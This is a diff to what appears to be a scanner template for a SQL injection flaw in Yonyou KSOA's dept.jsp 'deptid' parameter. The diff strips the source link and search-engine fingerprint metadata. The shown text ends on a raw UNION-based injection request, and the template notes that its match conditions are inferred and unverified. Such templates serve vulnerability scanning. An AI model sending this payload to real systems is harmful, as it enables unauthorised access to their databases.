@@ -3,14 +3,8 @@ info:
   name: 用友时空KSOAdeptid参数存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/5fd37160bdbf62b5a26a388a14c91700
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 5fd37160bdbf62b5a26a388a14c91700
-    fofa: + hunter`app.name="用友时空 KSOA"`
 http:
 - raw:
   - 'GET /common/dept.jsp?deptid=1%27%20UNION%20ALL%20SELECT%2060%2Csys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27%2C%27sterben.cc%27))-- HTTP/1.1
